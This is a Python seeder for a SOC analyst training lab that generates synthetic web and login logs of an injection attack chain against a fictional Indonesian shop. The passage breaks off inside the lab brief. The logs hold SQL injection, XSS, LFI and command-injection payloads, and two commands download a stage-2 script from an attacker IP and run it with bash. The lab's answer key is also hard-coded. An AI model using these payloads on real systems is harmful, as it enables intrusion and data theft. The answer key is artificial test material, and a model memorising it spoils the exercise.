#!/usr/bin/env python3
"""
SOC Lab - Web Injection Hunt : seeder.
Men-generate + ingest data dummy ke OpenSearch, lalu membuat index pattern &
default time range di OpenSearch Dashboards. Hanya pakai standard library.

Env:
  OPENSEARCH_URL   (default http://localhost:9200)
  DASHBOARDS_URL   (default http://localhost:5601)
  EVENT_COUNT      (default 9000)                     # jumlah event traffic normal (noise)
  SCENARIO_DAY     (default 2026-10-11)               # tanggal insiden (UTC)
"""
import base64
import datetime as dt
import json
import os
import random
import sys
import time
import urllib.request
import urllib.error

# ----------------------------------------------------------------------------
# KONFIGURASI
# ----------------------------------------------------------------------------
OPENSEARCH_URL = os.environ.get("OPENSEARCH_URL", "http://localhost:9200").rstrip("/")
DASHBOARDS_URL = os.environ.get("DASHBOARDS_URL", "http://localhost:5601").rstrip("/")
N_NORMAL_WEB = int(os.environ.get("EVENT_COUNT", "9000"))
SCENARIO_DAY = os.environ.get("SCENARIO_DAY", "2026-10-11")
SEED = int(os.environ.get("SEED", "1337"))

WEB_INDEX = "nusacommerce-web-access"
AUTH_INDEX = "nusacommerce-auth"
OS_VERSION_FOR_PANEL = "2.19.1"  # versi di metadata panel dashboard

# KUNCI JAWABAN skenario
ATTACKER_IP = "203.0.113.88"
ATTACKER_UA = "python-requests/2.32.3"          # fase manual (XSS, LFI, cmd injection)
SQLMAP_UA = "sqlmap/1.8.2#stable (https://sqlmap.org)"  # fase otomasi SQLi
SQLI_ENDPOINT = "/product.php"                  # parameter rentan: id
SQLI_TABLE = "ns_users"                         # tabel yang di-dump via UNION SELECT
XSS_ENDPOINT = "/search.php"                    # parameter rentan: q
LFI_ENDPOINT = "/view.php"                      # parameter rentan: page
LFI_FILE = "/etc/passwd"                        # file yang berhasil dibaca
CMDI_ENDPOINT = "/admin/tools/ping.php"         # parameter rentan: host
STOLEN_USER = "backup.admin"                    # akun dari hasil dump ns_users
C2_URL = "http://203.0.113.88/stage2.sh"

random.seed(SEED)


def log(*a):
    print("[seed]", *a, flush=True)


# ----------------------------------------------------------------------------
# DATA PENDUKUNG
# ----------------------------------------------------------------------------
BROWSER_UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Mozilla/5.0 (Linux; Android 14; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
]
BOT_UAS = [
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
]
RECON_UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
HOSTS = ["web-01", "web-02"]

NORMAL_PAGES = [
    ("/", 14), ("/index.php", 8), ("/products.php", 10), ("/product.php", 16),
    ("/search.php", 11), ("/view.php", 7), ("/cart.php", 6), ("/checkout.php", 3),
    ("/login.php", 5), ("/register.php", 2), ("/about.php", 2), ("/contact.php", 2),
    ("/api/products", 7), ("/api/cart", 4),
    ("/css/style.css", 9), ("/js/app.js", 9), ("/js/vendor.js", 5),
    ("/images/logo.png", 7), ("/images/banner.jpg", 6), ("/images/product-01.jpg", 5),
    ("/images/product-02.jpg", 5), ("/favicon.ico", 6), ("/robots.txt", 1),
]

# kata kunci pencarian normal — beberapa sengaja berisi tanda kutip / "1=1"
# supaya peserta belajar memisahkan FALSE POSITIVE dari injeksi sungguhan.
SEARCH_TERMS = [
    "kaos+polos", "sepatu+running", "tas+kulit", "kemeja+pria", "jam+tangan",
    "headset+bluetooth", "promo+1=1+gratis+ongkir", "O'Brien+coffee+table",
    "celana+jeans", "topi+baseball", "mouse+gaming", "keyboard+mekanik",
    "botol+minum", "d'Angelo+parfum", "sepeda+lipat", "lampu+meja",
]
VIEW_PAGES = ["home", "promo", "syarat-ketentuan", "kebijakan-privasi", "cara-belanja", "faq", "kontak"]

GEO = {}


def _geo(ip, cc, name):
    GEO[ip] = (cc, name)
    return ip


INTERNAL_IPS = [_geo(f"10.10.5.{i}", "ID", "Indonesia") for i in range(10, 40)]
ADMIN_LEGIT_IP = _geo("10.10.5.12", "ID", "Indonesia")
PENTEST_IP = _geo("10.10.5.31", "ID", "Indonesia")
CUSTOMER_IPS = []
for _ in range(80):
    CUSTOMER_IPS.append(_geo(
        "{}.{}.{}.{}".format(random.choice([103, 114, 36, 180, 182, 202, 118, 125]),
                             random.randint(0, 255), random.randint(0, 255), random.randint(1, 254)),
        "ID", "Indonesia"))

_geo(ATTACKER_IP, "RU", "Russia")
DECOY_WAF_IP = _geo("198.51.100.23", "NL", "Netherlands")       # payload banyak, SEMUA 403
DECOY_XSS_IP = _geo("192.0.2.77", "CN", "China")                # XSS ke endpoint tak ada (404)
NIKTO_IP = _geo("198.51.100.200", "US", "United States")        # scanner generik


def day_dt(h, m, s=0, micro=0):
    y, mo, d = (int(x) for x in SCENARIO_DAY.split("-"))
    return dt.datetime(y, mo, d, h, m, s, micro, tzinfo=dt.timezone.utc)


def iso(d):
    return d.strftime("%Y-%m-%dT%H:%M:%S.") + f"{int(d.microsecond/1000):03d}Z"


def ext_of(path):
    base = path.split("?")[0]
    if "." in base.rsplit("/", 1)[-1]:
        return base.rsplit(".", 1)[-1].lower()
    return ""


def web_doc(ts, ip, method, path, status, ua, user="-", req_bytes=0, resp_bytes=None, query="", referrer="-"):
    cc, cn = GEO.get(ip, ("ID", "Indonesia"))
    if resp_bytes is None:
        resp_bytes = random.randint(200, 6000) if status == 200 else random.randint(0, 600)
    return {
        "@timestamp": iso(ts),
        "event": {"module": "nginx", "dataset": "nginx.access", "category": "web", "kind": "event"},
        "source": {"ip": ip, "geo": {"country_iso_code": cc, "country_name": cn}},
        "host": {"name": random.choice(HOSTS)},
        "http": {"request": {"method": method, "body": {"bytes": req_bytes}, "referrer": referrer},
                 "response": {"status_code": status, "body": {"bytes": resp_bytes}}},
        "url": {"original": path + (("?" + query) if query else ""), "path": path,
                "query": query, "extension": ext_of(path)},
        "user_agent": {"original": ua},
        "user": {"name": user},
    }


def auth_doc(ts, ip, user, action, outcome, message, service="web-admin"):
    cc, cn = GEO.get(ip, ("ID", "Indonesia"))
    return {
        "@timestamp": iso(ts),
        "event": {"category": "authentication", "action": action, "outcome": outcome, "kind": "event"},
        "source": {"ip": ip, "geo": {"country_iso_code": cc, "country_name": cn}},
        "user": {"name": user}, "service": {"name": service}, "host": {"name": random.choice(HOSTS)},
        "authentication": {"method": "password"}, "message": message,
    }


# ----------------------------------------------------------------------------
# TRAFFIC NORMAL + NOISE + RED HERRING
# ----------------------------------------------------------------------------
def gen_normal_web(docs):
    pages, weights = zip(*NORMAL_PAGES)
    for _ in range(N_NORMAL_WEB):
        hour = random.choices(range(24), weights=[1, 1, 1, 1, 1, 2, 3, 5, 7, 9, 10, 11, 12, 11, 10, 9, 9, 10, 12, 13, 11, 8, 5, 3])[0]
        ts = day_dt(hour, random.randint(0, 59), random.randint(0, 59), random.randint(0, 999) * 1000)
        ip = random.choice(CUSTOMER_IPS + INTERNAL_IPS)
        path = random.choices(pages, weights=weights)[0]
        query, method = "", "GET"
        if path == "/product.php":
            query = "id=" + str(random.randint(1, 240))
        elif path == "/search.php":
            query = "q=" + random.choice(SEARCH_TERMS)
        elif path == "/view.php":
            query = "page=" + random.choice(VIEW_PAGES)
        if path in ("/cart.php", "/checkout.php", "/login.php", "/register.php", "/api/cart") and random.random() < 0.4:
            method = "POST"
        status = random.choices([200, 304, 301, 404, 500], weights=[86, 8, 2, 3, 1])[0]
        ua = random.choice(BROWSER_UAS * 6 + BOT_UAS)
        docs.append(web_doc(ts, ip, method, path, status, ua, query=query,
                            referrer="https://shop.nusacommerce.local/" if random.random() < 0.5 else "-"))


def gen_normal_auth(docs):
    for _ in range(70):
        hour = random.choices(range(7, 22), weights=[2, 4, 6, 8, 9, 9, 8, 7, 7, 8, 9, 8, 6, 4, 3])[0]
        ts = day_dt(hour, random.randint(0, 59), random.randint(0, 59))
        ip = random.choice(INTERNAL_IPS)
        user = random.choice(["admin", "budi.staff", "sari.cs", "operator1", "gudang"])
        if random.random() < 0.12:
            docs.append(auth_doc(ts, ip, user, "login_failed", "failure", f"Failed password for {user} (wrong password)"))
        else:
            docs.append(auth_doc(ts, ip, user, "login_success", "success", f"Accepted password for {user}"))


def gen_decoy_waf_blocked(web):
    """RED HERRING #1 — IP ini menyemburkan RATUSAN payload injeksi (SQLi/XSS/LFI)
    tapi SEMUANYA ditolak WAF (403). Jadi Top Source IP, tapi tidak pernah berhasil."""
    payloads = [
        (SQLI_ENDPOINT, "id=1'+OR+'1'='1"),
        (SQLI_ENDPOINT, "id=1+OR+1=1--"),
        (SQLI_ENDPOINT, "id=1+UNION+SELECT+NULL,NULL,NULL"),
        (SQLI_ENDPOINT, "id=1;WAITFOR+DELAY+'0:0:5'--"),
        (SQLI_ENDPOINT, "id=1%27%20AND%20SLEEP%285%29"),
        (XSS_ENDPOINT, "q=<script>alert('xss')</script>"),
        (XSS_ENDPOINT, "q=%3Cscript%3Edocument.cookie%3C/script%3E"),
        (XSS_ENDPOINT, "q=<body+onload=alert(1)>"),
        (LFI_ENDPOINT, "page=../../../../etc/passwd"),
        (LFI_ENDPOINT, "page=..%2f..%2f..%2f..%2fetc%2fshadow"),
        (LFI_ENDPOINT, "page=/proc/self/environ"),
        ("/login.php", "u=admin'--&p=x"),
        ("/api/products", "sort=id;cat+/etc/passwd"),
    ]
    t = day_dt(1, 40, 0)
    for _ in range(300):
        t += dt.timedelta(seconds=random.randint(1, 6))
        path, q = random.choice(payloads)
        web.append(web_doc(t, DECOY_WAF_IP, random.choice(["GET", "GET", "POST"]), path, 403,
                           "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/115.0",
                           query=q, resp_bytes=421))


def gen_decoy_xss_404(web):
    """RED HERRING #2 — payload XSS ke endpoint yang TIDAK ADA: selalu 404."""
    paths = ["/cari.php", "/s.php", "/find.php", "/searchresult.php", "/q.php", "/suche.php"]
    payloads = ["q=<script>alert(1)</script>", "q=<img+src=x+onerror=alert(1)>",
                "q=<svg/onload=alert(1)>", "keyword=\"><script>alert(document.domain)</script>"]
    t = day_dt(4, 22, 0)
    for _ in range(60):
        t += dt.timedelta(seconds=random.randint(3, 15))
        web.append(web_doc(t, DECOY_XSS_IP, "GET", random.choice(paths), 404,
                           "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Gecko/20100101 Firefox/120.0",
                           query=random.choice(payloads)))


def gen_nikto_noise(web):
    paths = ["/phpinfo.php", "/test.php", "/.env", "/.git/config", "/wp-login.php", "/phpmyadmin/",
             "/server-status", "/config.php.bak", "/backup.zip", "/admin/", "/.htaccess", "/web.config",
             "/console", "/xmlrpc.php", "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "/cgi-bin/test.cgi"]
    t = day_dt(2, 5, 0)
    for _ in range(220):
        t += dt.timedelta(seconds=random.randint(1, 4))
        status = random.choices([404, 403, 200, 301], weights=[80, 10, 5, 5])[0]
        web.append(web_doc(t, NIKTO_IP, random.choice(["GET", "HEAD"]), random.choice(paths), status,
                           "Mozilla/5.0 (compatible; Nikto/2.5.0)"))


def gen_pentest_scan(web):
    """RED HERRING #3 — pentest INTERNAL yang terjadwal: payload injeksi dari IP
    kantor (10.10.5.31) dengan UA scanner, semua dibatasi (403/404)."""
    combos = [(SQLI_ENDPOINT, "id=1'", 403), (XSS_ENDPOINT, "q=<script>1</script>", 403),
              (LFI_ENDPOINT, "page=../../etc/passwd", 403), ("/api/products", "q=%27", 404),
              (SQLI_ENDPOINT, "id=1+AND+1=1", 403)]
    t = day_dt(6, 30, 0)
    for _ in range(45):
        t += dt.timedelta(seconds=random.randint(5, 25))
        p, q, st = random.choice(combos)
        web.append(web_doc(t, PENTEST_IP, "GET", p, st, "OWASP ZAP/2.15.0 (internal-scan)", query=q))


def gen_legit_admin_activity(web, auth):
    """Admin sah: login dari IP kantor dan memakai /admin/tools/ping.php secara WAJAR."""
    t = day_dt(13, 20, 0)
    auth.append(auth_doc(t, ADMIN_LEGIT_IP, "admin", "login_success", "success", "Accepted password for admin"))
    web.append(web_doc(t + dt.timedelta(seconds=3), ADMIN_LEGIT_IP, "GET", "/admin/dashboard.php", 200, BROWSER_UAS[0], user="admin"))
    for host in ["127.0.0.1", "db-01.internal", "10.10.5.1", "cache-01.internal"]:
        t += dt.timedelta(minutes=random.randint(1, 4))
        web.append(web_doc(t, ADMIN_LEGIT_IP, "GET", CMDI_ENDPOINT, 200, BROWSER_UAS[0],
                           user="admin", query="host=" + host, resp_bytes=random.randint(300, 900)))


# ----------------------------------------------------------------------------
# RANTAI SERANGAN (KUNCI JAWABAN)
#   recon -> XSS reflected -> SQLi manual -> sqlmap -> dump ns_users ->
#   login pakai kredensial curian -> LFI -> command injection -> unduh stage-2
# ----------------------------------------------------------------------------
def gen_attack_chain(web, auth):
    ip = ATTACKER_IP

    # --- Fase 1: Recon (08:40) — browsing biasa, memetakan parameter ---
    recon = [("GET", "/", 200, ""), ("GET", "/robots.txt", 200, ""),
             ("GET", "/products.php", 200, ""), ("GET", SQLI_ENDPOINT, 200, "id=12"),
             ("GET", XSS_ENDPOINT, 200, "q=kaos"), ("GET", LFI_ENDPOINT, 200, "page=home"),
             ("GET", "/.git/config", 404, ""), ("GET", "/admin", 301, ""),
             ("GET", "/admin/login.php", 200, ""), ("GET", "/api/products", 200, "")]
    t = day_dt(8, 40, 0)
    for method, path, status, q in recon:
        t += dt.timedelta(seconds=random.randint(15, 50))
        web.append(web_doc(t, ip, method, path, status, RECON_UA, query=q))

    # --- Fase 2: Reflected XSS di /search.php?q= (09:05) — payload DIPANTULKAN (200) ---
    xss_payloads = [
        ("q=<script>alert(1)</script>", 3120),
        ("q=\"><script>alert(1)</script>", 3140),
        ("q=<img+src=x+onerror=alert(1)>", 3155),
        ("q=<svg/onload=alert(document.domain)>", 3168),
        ("q=<script>alert(document.cookie)</script>", 3190),
        ("q=<script+src=http://203.0.113.88/k.js></script>", 3210),
    ]
    t = day_dt(9, 5, 0)
    for q, rb in xss_payloads:
        t += dt.timedelta(seconds=random.randint(8, 40))
        web.append(web_doc(t, ip, "GET", XSS_ENDPOINT, 200, ATTACKER_UA, query=q, resp_bytes=rb))

    # --- Fase 3: SQLi manual di /product.php?id= (09:14) — cari titik injeksi ---
    sqli_probe = [
        ("id=12'", 500, 0), ("id=12\"", 500, 0), ("id=12+AND+1=1", 200, 4210),
        ("id=12+AND+1=2", 200, 980), ("id=12+ORDER+BY+1", 200, 4210),
        ("id=12+ORDER+BY+5", 200, 4210), ("id=12+ORDER+BY+6", 500, 0),
        ("id=12+AND+SLEEP(5)", 200, 4208),
    ]
    t = day_dt(9, 14, 0)
    for q, st, rb in sqli_probe:
        t += dt.timedelta(seconds=random.randint(10, 45))
        web.append(web_doc(t, ip, "GET", SQLI_ENDPOINT, st, ATTACKER_UA, query=q, resp_bytes=rb))

    # --- Fase 4: Otomasi sqlmap (09:28) — UA sqlmap, ratusan request ke parameter id ---
    sqlmap_frag = [
        "id=12+AND+4521=4521", "id=12+AND+7312=9999", "id=12'+AND+'a'='a",
        "id=12+AND+(SELECT+1+FROM+(SELECT+SLEEP(5))x)", "id=12+UNION+ALL+SELECT+NULL",
        "id=12+UNION+ALL+SELECT+NULL,NULL", "id=12+UNION+ALL+SELECT+NULL,NULL,NULL",
        "id=12+UNION+ALL+SELECT+NULL,NULL,NULL,NULL", "id=12+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL",
        "id=12+AND+EXTRACTVALUE(1,CONCAT(0x5c,VERSION()))",
        "id=12+AND+ROW(1,1)>(SELECT+COUNT(*),CONCAT(DATABASE(),0x3a,FLOOR(RAND(0)*2))x+FROM+information_schema.tables+GROUP+BY+x)",
        "id=12+PROCEDURE+ANALYSE(EXTRACTVALUE(1,CONCAT(0x5c,VERSION())),1)",
    ]
    t = day_dt(9, 28, 0)
    for _ in range(140):
        t += dt.timedelta(seconds=random.randint(1, 5))
        q = random.choice(sqlmap_frag)
        st = random.choices([200, 500], weights=[75, 25])[0]
        web.append(web_doc(t, ip, "GET", SQLI_ENDPOINT, st, SQLMAP_UA, query=q,
                           resp_bytes=random.randint(900, 4300) if st == 200 else 0))

    # --- Fase 5: Dump data via UNION SELECT (10:05) — tabel ns_users ---
    dump = [
        ("id=-1+UNION+SELECT+1,2,3,4,5", 200, 4100),
        ("id=-1+UNION+SELECT+1,database(),version(),4,5", 200, 4180),
        ("id=-1+UNION+SELECT+1,schema_name,3,4,5+FROM+information_schema.schemata", 200, 5260),
        ("id=-1+UNION+SELECT+1,table_name,3,4,5+FROM+information_schema.tables+WHERE+table_schema=database()", 200, 9340),
        (f"id=-1+UNION+SELECT+1,column_name,3,4,5+FROM+information_schema.columns+WHERE+table_name='{SQLI_TABLE}'", 200, 6120),
        (f"id=-1+UNION+SELECT+1,username,password,email,5+FROM+{SQLI_TABLE}", 200, 48210),
        (f"id=-1+UNION+SELECT+1,GROUP_CONCAT(username,0x3a,password),3,4,5+FROM+{SQLI_TABLE}", 200, 52880),
    ]
    t = day_dt(10, 5, 0)
    for q, st, rb in dump:
        t += dt.timedelta(seconds=random.randint(20, 90))
        web.append(web_doc(t, ip, "GET", SQLI_ENDPOINT, st, ATTACKER_UA, query=q, resp_bytes=rb))

    # --- Fase 6: Login pakai kredensial curian (10:18:42) — akun backup.admin ---
    t = day_dt(10, 18, 42)
    web.append(web_doc(t, ip, "GET", "/admin/login.php", 200, ATTACKER_UA))
    web.append(web_doc(t + dt.timedelta(seconds=6), ip, "POST", "/admin/login.php", 302, ATTACKER_UA, req_bytes=142, resp_bytes=0))
    auth.append(auth_doc(t + dt.timedelta(seconds=6), ip, STOLEN_USER, "login_success", "success",
                         f"Accepted password for {STOLEN_USER} (credentials from {SQLI_TABLE} dump)"))
    web.append(web_doc(t + dt.timedelta(seconds=9), ip, "GET", "/admin/dashboard.php", 200, ATTACKER_UA, user=STOLEN_USER))

    # --- Fase 7: Local File Inclusion di /view.php?page= (10:35) ---
    lfi = [
        ("page=../../../../etc/passwd", 200, 1842),
        ("page=../../../../etc/shadow", 403, 0),
        ("page=....//....//....//....//etc/passwd", 403, 0),
        ("page=php://filter/convert.base64-encode/resource=config", 200, 2410),
        ("page=../../../../var/log/nginx/access.log", 200, 73920),
        ("page=../../../../proc/self/environ", 200, 1210),
        ("page=/etc/passwd%00", 200, 1842),
    ]
    t = day_dt(10, 35, 0)
    for q, st, rb in lfi:
        t += dt.timedelta(seconds=random.randint(15, 70))
        web.append(web_doc(t, ip, "GET", LFI_ENDPOINT, st, ATTACKER_UA, user=STOLEN_USER, query=q, resp_bytes=rb))

    # --- Fase 8: Injeksi LAIN yang dicoba (10:48) — sebagian besar gagal/ditolak ---
    others = [
        ("/profile.php", "name={{7*7}}", 200, 1420),                                   # SSTI
        ("/profile.php", "name=${{7*7}}", 403, 0),                                     # SSTI varian
        ("/api/import.php", "src=<!DOCTYPE+foo+[<!ENTITY+x+SYSTEM+'file:///etc/passwd'>]>", 403, 0),   # XXE
        ("/api/login", "user[$ne]=1&pass[$ne]=1", 400, 0),                             # NoSQL injection
        ("/redirect.php", "url=%0d%0aSet-Cookie:sess=hijack", 403, 0),                 # CRLF injection
        ("/api/fetch.php", "url=http://169.254.169.254/latest/meta-data/", 403, 0),     # SSRF
        ("/dir.php", "cn=*)(uid=*))(|(uid=*", 404, 0),                                 # LDAP injection
        ("/xmlsearch.php", "q='+or+'1'='1", 404, 0),                                   # XPath injection
        ("/contact.php", "email=a@b.c%0ABcc:attacker@evil.tld", 403, 0),               # header injection
    ]
    t = day_dt(10, 48, 0)
    for p, q, st, rb in others:
        t += dt.timedelta(seconds=random.randint(20, 80))
        web.append(web_doc(t, ip, random.choice(["GET", "POST"]), p, st, ATTACKER_UA,
                           user=STOLEN_USER, query=q, resp_bytes=rb))

    # --- Fase 9: OS command injection di /admin/tools/ping.php?host= (10:58) ---
    cmdi = [
        ("host=127.0.0.1", 200, 640),
        ("host=127.0.0.1;id", 200, 712),
        ("host=127.0.0.1;whoami", 200, 698),
        ("host=127.0.0.1|uname+-a", 200, 745),
        ("host=127.0.0.1;cat+/etc/passwd", 200, 2480),
        ("host=127.0.0.1;ls+-la+/var/www/html", 200, 3160),
        ("host=127.0.0.1;cat+/var/www/html/config.php", 200, 1980),
        ("host=`which+curl+wget+python3`", 200, 660),
    ]
    t = day_dt(10, 58, 0)
    for q, st, rb in cmdi:
        t += dt.timedelta(seconds=random.randint(20, 75))
        web.append(web_doc(t, ip, "GET", CMDI_ENDPOINT, st, ATTACKER_UA, user=STOLEN_USER, query=q, resp_bytes=rb))

    # --- Fase 10: Command & Control — unduh + jalankan payload tahap-2 (11:06) ---
    t = day_dt(11, 6, 20)
    web.append(web_doc(t, ip, "GET", CMDI_ENDPOINT, 200, ATTACKER_UA, user=STOLEN_USER,
                       query=f"host=127.0.0.1;curl+{C2_URL}+-o+/tmp/s.sh", resp_bytes=118))
    t += dt.timedelta(seconds=34)
    web.append(web_doc(t, ip, "GET", CMDI_ENDPOINT, 200, ATTACKER_UA, user=STOLEN_USER,
                       query="host=127.0.0.1;chmod+%2Bx+/tmp/s.sh;bash+/tmp/s.sh", resp_bytes=96))
    t += dt.timedelta(seconds=48)
    web.append(web_doc(t, ip, "GET", CMDI_ENDPOINT, 200, ATTACKER_UA, user=STOLEN_USER,
                       query="host=127.0.0.1;crontab+-l", resp_bytes=132))

    # --- Fase 11: Persistence — akses ulang sepanjang hari ---
    for h, m in [(15, 12), (19, 40), (22, 7)]:
        t = day_dt(h, m, random.randint(0, 59))
        web.append(web_doc(t, ip, "GET", CMDI_ENDPOINT, 200, ATTACKER_UA, user=STOLEN_USER,
                           query="host=127.0.0.1;" + random.choice(["id", "uptime", "ls+/tmp", "ps+aux"]),
                           resp_bytes=random.randint(150, 900)))
        web.append(web_doc(t + dt.timedelta(seconds=random.randint(10, 60)), ip, "GET", SQLI_ENDPOINT, 200,
                           ATTACKER_UA, user=STOLEN_USER,
                           query=f"id=-1+UNION+SELECT+1,username,password,email,5+FROM+{SQLI_TABLE}",
                           resp_bytes=48210))


# ----------------------------------------------------------------------------
# MAPPING
# ----------------------------------------------------------------------------
WEB_MAPPING = {
    "settings": {"index": {"number_of_shards": 1, "number_of_replicas": 0}},
    "mappings": {"properties": {
        "@timestamp": {"type": "date"},
        "event": {"properties": {"module": {"type": "keyword"}, "dataset": {"type": "keyword"}, "category": {"type": "keyword"}, "kind": {"type": "keyword"}}},
        "source": {"properties": {"ip": {"type": "ip"}, "geo": {"properties": {"country_iso_code": {"type": "keyword"}, "country_name": {"type": "keyword"}}}}},
        "host": {"properties": {"name": {"type": "keyword"}}},
        "http": {"properties": {
            "request": {"properties": {"method": {"type": "keyword"}, "body": {"properties": {"bytes": {"type": "long"}}}, "referrer": {"type": "keyword"}}},
            "response": {"properties": {"status_code": {"type": "integer"}, "body": {"properties": {"bytes": {"type": "long"}}}}}}},
        "url": {"properties": {"original": {"type": "keyword"}, "path": {"type": "keyword"}, "query": {"type": "keyword"}, "extension": {"type": "keyword"}}},
        "user_agent": {"properties": {"original": {"type": "keyword"}}},
        "user": {"properties": {"name": {"type": "keyword"}}},
    }},
}
AUTH_MAPPING = {
    "settings": {"index": {"number_of_shards": 1, "number_of_replicas": 0}},
    "mappings": {"properties": {
        "@timestamp": {"type": "date"},
        "event": {"properties": {"category": {"type": "keyword"}, "action": {"type": "keyword"}, "outcome": {"type": "keyword"}, "kind": {"type": "keyword"}}},
        "source": {"properties": {"ip": {"type": "ip"}, "geo": {"properties": {"country_iso_code": {"type": "keyword"}, "country_name": {"type": "keyword"}}}}},
        "user": {"properties": {"name": {"type": "keyword"}}},
        "service": {"properties": {"name": {"type": "keyword"}}},
        "host": {"properties": {"name": {"type": "keyword"}}},
        "authentication": {"properties": {"method": {"type": "keyword"}}},
        "message": {"type": "text", "fields": {"keyword": {"type": "keyword", "ignore_above": 1024}}},
    }},
}


# ----------------------------------------------------------------------------
# HTTP HELPERS
# ----------------------------------------------------------------------------
_BASIC_AUTH = os.environ.get("BASIC_AUTH", "")  # "user:pass" -> header Authorization
_AUTH_HEADER = ("Basic " + base64.b64encode(_BASIC_AUTH.encode()).decode()) if _BASIC_AUTH else None


def req(method, url, data=None, ctype="application/json", extra_headers=None, timeout=120):
    headers = {"Content-Type": ctype}
    if _AUTH_HEADER:
        headers["Authorization"] = _AUTH_HEADER
    if extra_headers:
        headers.update(extra_headers)
    body = data.encode() if isinstance(data, str) else data
    r = urllib.request.Request(url, data=body, headers=headers, method=method)
    try:
        with urllib.request.urlopen(r, timeout=timeout) as resp:
            return resp.status, resp.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()
    except Exception as e:  # noqa
        return 0, str(e)


def wait_opensearch():
    log(f"menunggu OpenSearch di {OPENSEARCH_URL} ...")
    for _ in range(90):
        code, _ = req("GET", f"{OPENSEARCH_URL}/_cluster/health", timeout=5)
        if code == 200:
            log("OpenSearch siap.")
            return True
        time.sleep(2)
    log("ERROR: OpenSearch tidak siap.")
    return False


def harden_security():
    """Petakan user anonymous -> role READ-ONLY lewat Security REST API (sbg admin).
    Dijalankan tiap start (idempoten via PUT). Anonymous dapat:
      - readall        : baca semua index (termasuk data nusacommerce-*)
      - kibana_user    : akses saved object/tenant (agar dashboard bisa DILIHAT)
      - kibana_read_only : penanda read-only mode di Dashboards (blok tulis/edit/hapus)
    Tulis ke data index tetap ditolak (readall hanya baca); tulis .kibana ditolak readonly_mode.
    """
    anon = "opendistro_security_anonymous_backendrole"
    api = f"{OPENSEARCH_URL}/_plugins/_security/api"
    # Role read-only: baca data + baca saved object Global tenant, TANPA izin tulis apa pun.
    role = {
        "cluster_permissions": ["cluster_composite_ops_ro", "cluster:monitor/*"],
        "index_permissions": [
            {"index_patterns": ["nusacommerce-*"],
             "allowed_actions": ["read", "indices:data/read/*", "indices:monitor/*",
                                 "indices:admin/mappings/get", "indices:admin/mappings/fields/get*",
                                 "indices:admin/get", "indices:admin/aliases/get", "indices:admin/resolve/index"]},
            {"index_patterns": [".kibana", ".kibana_*", ".opensearch_dashboards", ".opensearch_dashboards_*"],
             "allowed_actions": ["read", "indices:data/read/*", "indices:admin/mappings/get",
                                 "indices:admin/get", "indices:admin/aliases/get"]},
        ],
        "tenant_permissions": [
            {"tenant_patterns": ["global_tenant"], "allowed_actions": ["kibana_all_read"]},
        ],
    }
    code, resp = req("PUT", f"{api}/roles/soc_viewer", json.dumps(role))
    log(f"  role soc_viewer: HTTP {code} {'OK' if code in (200,201) else resp[:160]}")
    for r, body in [("soc_viewer", {"backend_roles": [anon]}),
                    ("kibana_read_only", {"backend_roles": [anon]})]:
        code, resp = req("PUT", f"{api}/rolesmapping/{r}", json.dumps(body))
        log(f"  rolesmapping {r}: HTTP {code} {'OK' if code in (200,201) else resp[:160]}")


def recreate_index(name, mapping):
    req("DELETE", f"{OPENSEARCH_URL}/{name}")
    code, body = req("PUT", f"{OPENSEARCH_URL}/{name}", json.dumps(mapping))
    if code not in (200, 201):
        log(f"ERROR buat index {name}: {code} {body[:300]}")
        sys.exit(1)
    log(f"index '{name}' dibuat")


def bulk_load(name, docs, chunk=2000):
    total = 0
    for i in range(0, len(docs), chunk):
        lines = []
        for d in docs[i:i + chunk]:
            lines.append(json.dumps({"index": {"_index": name}}))
            lines.append(json.dumps(d))
        code, body = req("POST", f"{OPENSEARCH_URL}/_bulk", "\n".join(lines) + "\n", ctype="application/x-ndjson")
        if code != 200:
            log(f"ERROR bulk {code}: {body[:300]}")
            sys.exit(1)
        if '"errors":true' in body:
            log(f"WARN sebagian dokumen gagal: {body[:300]}")
        total += len(docs[i:i + chunk])
    req("POST", f"{OPENSEARCH_URL}/{name}/_refresh")
    log(f"{total} dokumen dimuat ke '{name}'")


# ----------------------------------------------------------------------------
# DASHBOARDS SAVED OBJECTS
# ----------------------------------------------------------------------------
DASHBOARD_ID = "soc-injection-dashboard"

BRIEF_MD = (
    "## 🧪 Operation: Tainted Input — SOC Analyst Lab\n\n"
    "Kamu **SOC Analyst** di **Nusacommerce** (toko online). WAF mengirim lonjakan alert "
    "`injection` sepanjang hari & DBA melapor ada query `UNION SELECT` aneh di slow-log. "
    "Dugaan: **satu penyerang berhasil menembus lewat parameter yang tidak divalidasi** — "
    "XSS, SQL Injection, Local File Inclusion, sampai OS command injection. "
    "Gunakan visualisasi & **Discover** untuk membongkar rantai serangannya.\n\n"
    "**Data:** `nusacommerce-web-access*` (akses web) · `nusacommerce-auth*` (login). "
    "Insiden: **11 Okt 2026 (UTC)** — time range sudah diset ke hari itu.\n\n"
    "**Tips:** pelaku sejati memenuhi SELURUH rantai — payload **berstatus 200** (bukan 403/404) → "
    "SQLi sampai tahap `UNION SELECT ... FROM <tabel>` → login dengan kredensial curian → "
    "LFI → command injection → unduh payload tahap-2. "
    "Abaikan IP yang payload-nya **selalu 403 (diblok WAF)** atau **404 (endpoint tidak ada)**, "
    "dan hati-hati **false positive**: pencarian pelanggan yang memang berisi tanda kutip "
